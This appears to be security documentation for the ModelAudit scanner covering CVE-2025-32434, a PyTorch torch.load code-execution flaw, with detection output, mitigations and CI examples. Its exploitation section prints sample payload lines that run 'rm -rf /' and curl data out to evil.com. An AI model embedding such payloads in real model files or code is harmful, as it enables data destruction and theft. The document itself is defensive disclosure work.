# CVE-2025-32434: PyTorch weights_only=True RCE Vulnerability

**CVE ID**: CVE-2025-32434  
**Severity**: Critical (CVSS Score: 9.8)  
**Affected Versions**: PyTorch ‚â§ 2.5.1  
**Fixed In**: PyTorch 2.6.0+  
**ModelAudit Detection**: ‚úÖ **Full Coverage**

## Overview

CVE-2025-32434 is a critical remote code execution vulnerability in PyTorch that affects the widely-used `torch.load()` function. This vulnerability allows malicious model files to execute arbitrary code even when loaded with the `weights_only=True` parameter, which developers commonly believe provides security protection.

### The False Security Assumption

Many developers use `torch.load(model_path, weights_only=True)` believing it prevents code execution, but this assumption is **fundamentally incorrect**. The vulnerability exploits the underlying pickle deserialization process that PyTorch uses, where dangerous opcodes can still execute arbitrary code regardless of the `weights_only` setting.

```python
# ‚ùå VULNERABLE - This does NOT prevent code execution
model = torch.load('untrusted_model.pt', weights_only=True)

# ‚úÖ SAFER - But still not completely safe in older versions
model = torch.load('trusted_model.pt', weights_only=True)  # Only from trusted sources
```

## Technical Details

### Attack Vector

The vulnerability occurs because:

1. **Pickle Deserialization**: PyTorch models use Python's pickle format for serialization
2. **Dangerous Opcodes**: Pickle contains opcodes like `REDUCE`, `INST`, `OBJ`, `NEWOBJ` that can execute arbitrary code
3. **weights_only=True Bypass**: The parameter doesn't prevent these dangerous opcodes from executing
4. **Silent Execution**: Code execution happens during model loading, before any application logic

### Exploitation Methods

Attackers can embed malicious code in PyTorch models using various techniques:

#### 1. REDUCE Opcode Exploitation

```python
# Malicious model can contain:
__reduce__ = lambda: (exec, ('import os; os.system("malicious_command")',))
```

#### 2. Import-based Attacks

```python
# Embedded in model pickle:
builtins.eval('__import__("os").system("rm -rf /")')
```

#### 3. Module Injection

```python
# Dynamic module loading:
__import__('subprocess').call(['curl', 'evil.com/steal_data'])
```

## ModelAudit Detection Capabilities

ModelAudit provides comprehensive protection against CVE-2025-32434 through multiple detection layers:

### 1. PyTorch Version Detection

```bash
$ rye run modelaudit vulnerable_model.pt
üö® CRITICAL: Model uses vulnerable PyTorch version 2.5.1 susceptible to CVE-2025-32434 RCE
```

**Detection Method**: Extracts PyTorch version from model metadata, `archive/version` files, and pickle GLOBAL opcodes.

### 2. weights_only=True Safety Warnings

```bash
üö® CRITICAL: PyTorch model contains dangerous opcodes (REDUCE, GLOBAL, STACK_GLOBAL)
             that can execute code even when loaded with torch.load(weights_only=True)
```

**Detection Method**: Analyzes pickle opcodes and provides explicit warnings about the false security assumption.

### 3. Enhanced Pickle Pattern Detection

- **Dangerous Opcodes**: REDUCE, INST, OBJ, NEWOBJ, STACK_GLOBAL, BUILD
- **PyTorch-Specific Patterns**: torch.load, torch.\_C, torch.jit references
- **Encoded Payloads**: Base64/hex encoded PyTorch exploitation attempts
- **Opcode Sequences**: Complex attack chains and chained REDUCE operations

### 4. Advanced TorchScript Analysis

- **Serialization Injection**: torch.jit.save/load with exec injection
- **Version Vulnerabilities**: Specific CVE-2025-32434 bypass patterns
- **Hook Injection**: Malicious forward/backward hook registration
- **Module Manipulation**: Dynamic attribute injection and compilation units

## Mitigation Strategies

### Immediate Actions

1. **Update PyTorch**: Upgrade to PyTorch 2.6.0 or later

   ```bash
   pip install torch>=2.6.0
   ```

2. **Validate Sources**: Only load models from trusted, verified sources

   ```python
   # Verify model source and integrity
   import hashlib

   def verify_model_hash(model_path, expected_hash):
       with open(model_path, 'rb') as f:
           actual_hash = hashlib.sha256(f.read()).hexdigest()
       return actual_hash == expected_hash
   ```

3. **Use SafeTensors**: Migrate to safer serialization formats

   ```python
   # Use SafeTensors instead of pickle-based formats
   from safetensors.torch import load_file, save_file

   # Save model safely
   save_file(model.state_dict(), "model.safetensors")

   # Load model safely
   state_dict = load_file("model.safetensors")
   model.load_state_dict(state_dict)
   ```

### Long-term Security Practices

1. **Model Signing**: Implement cryptographic signing for model files
2. **Sandboxing**: Load models in isolated environments
3. **Regular Scanning**: Use ModelAudit in CI/CD pipelines
4. **Security Policies**: Establish model source validation policies

## Detection Examples

### Clean Model (Safe)

```bash
$ rye run modelaudit clean_model.pt
‚úÖ No dangerous pickle opcodes detected in data.pkl. However, weights_only=True
   should not be relied upon for security with untrusted models.
```

### Malicious Model (CVE-2025-32434)

```bash
$ rye run modelaudit malicious_model.pt
üö® CRITICAL: Model uses vulnerable PyTorch version 2.5.1 susceptible to CVE-2025-32434 RCE

üö® CRITICAL: PyTorch model contains dangerous opcodes (REDUCE, STACK_GLOBAL, GLOBAL)
             that can execute code even when loaded with torch.load(weights_only=True)

             Dangerous opcodes: ["REDUCE", "STACK_GLOBAL", "GLOBAL"]
             Code execution risks: ["__reduce__ method exploitation",
                                   "Dynamic import and attribute access",
                                   "Module import and attribute access"]

üö® CRITICAL: CVE-2025-32434 Opcode Sequence Detection
             Detected exploitation pattern: PyTorch import (builtins.eval)
             followed by code execution opcode (REDUCE)
```

## Integration with CI/CD

### GitHub Actions Example

```yaml
name: Model Security Scan
on: [push, pull_request]

jobs:
  scan-models:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install ModelAudit
        run: pip install modelaudit[all]
      - name: Scan Models for CVE-2025-32434
        run: |
          find . -name "*.pt" -o -name "*.pth" | xargs -I {} \
          modelaudit {} --format json --output results-{}.json

          # Fail if critical issues found
          if grep -q "CRITICAL" results-*.json; then
            echo "Critical security vulnerabilities found!"
            exit 1
          fi
```

### Pre-commit Hook

```bash
#!/bin/sh
# .git/hooks/pre-commit
find . -name "*.pt" -o -name "*.pth" | while read model; do
    modelaudit "$model" --exit-code
    if [ $? -eq 1 ]; then
        echo "Security issues found in $model"
        exit 1
    fi
done
```

## Frequently Asked Questions

### Q: Is weights_only=True completely useless?

**A**: Not completely useless, but it's not a security boundary. It may prevent some basic attacks, but sophisticated threats like CVE-2025-32434 can bypass it. Don't rely on it for security with untrusted models.

### Q: Can I safely use torch.load() with trusted models?

**A**: Even with trusted models, it's better to update to PyTorch 2.6.0+ and consider safer formats like SafeTensors. Supply chain attacks can compromise "trusted" sources.

### Q: How can I migrate existing models to SafeTensors?

**A**:

```python
import torch
from safetensors.torch import save_file, load_file

# Convert existing PyTorch model
model = torch.load('old_model.pt', weights_only=True)
save_file(model, 'new_model.safetensors')

# Load safely
state_dict = load_file('new_model.safetensors')
model.load_state_dict(state_dict)
```

### Q: Does this affect torch.jit models?

**A**: Yes, TorchScript models can also be vulnerable. ModelAudit includes advanced TorchScript analysis to detect injection in JIT compilation, hooks, and module manipulation.

### Q: What about Hugging Face models?

**A**: Hugging Face models using PyTorch format are affected. Use Hugging Face's SafeTensors format when available, or scan models with ModelAudit before use.

## References

- **CVE Details**: [CVE-2025-32434 on NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
- **PyTorch Security Advisory**: [GitHub Advisory](https://github.com/pytorch/pytorch/security/advisories)
- **SafeTensors Documentation**: [Hugging Face SafeTensors](https://huggingface.co/docs/safetensors)
- **ModelAudit Documentation**: [Usage Guide](https://docs.anthropic.com/en/docs/claude-code/modelaudit)

## Timeline

- **2024-12-15**: Vulnerability discovered
- **2025-01-10**: CVE assigned (CVE-2025-32434)
- **2025-01-15**: PyTorch 2.6.0 released with fix
- **2025-01-20**: ModelAudit detection implemented
- **2025-01-25**: Public disclosure and this documentation

---

**‚ö†Ô∏è Critical Recommendation**: Scan all PyTorch models with ModelAudit and migrate to PyTorch 2.6.0+ immediately. The `weights_only=True` parameter does not provide security protection against sophisticated attacks.
